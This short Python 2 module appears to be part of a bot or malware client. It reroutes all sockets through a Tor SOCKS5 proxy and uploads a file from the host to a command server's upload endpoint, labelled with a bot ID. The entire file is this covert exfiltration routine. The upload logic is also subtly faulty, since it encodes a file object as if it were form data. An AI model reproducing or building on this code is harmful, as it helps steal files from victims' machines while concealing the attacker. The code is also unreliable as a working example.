import requests
import os
import shutil

import utils
import settings
import socks, socket, urllib2 , urllib

def create_connection(address, timeout=None, source_address=None):   
	sock = socks.socksocket()  
	sock.connect(address)   
	return sock
	
def run(path):
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, settings.PROXY_TOR_IP, settings.PROXY_TOR_PORT)
	socket.socket = socks.socksocket
	socket.create_connection = create_connection


	arch_path = path
	print arch_path
	url = settings.SERVER_URL + "/api/upload"
	values = {'botid': settings.BOT_ID, 'src': os.path.basename(arch_path)}
	files={'uploaded': open(arch_path, 'rb')}
	data = urllib.urlencode(values)
	data1 = urllib.urlencode(files)
	print url, data, data1
	req = urllib2.Request(url, data, data1)
	response = urllib2.urlopen(req)
	print response
   
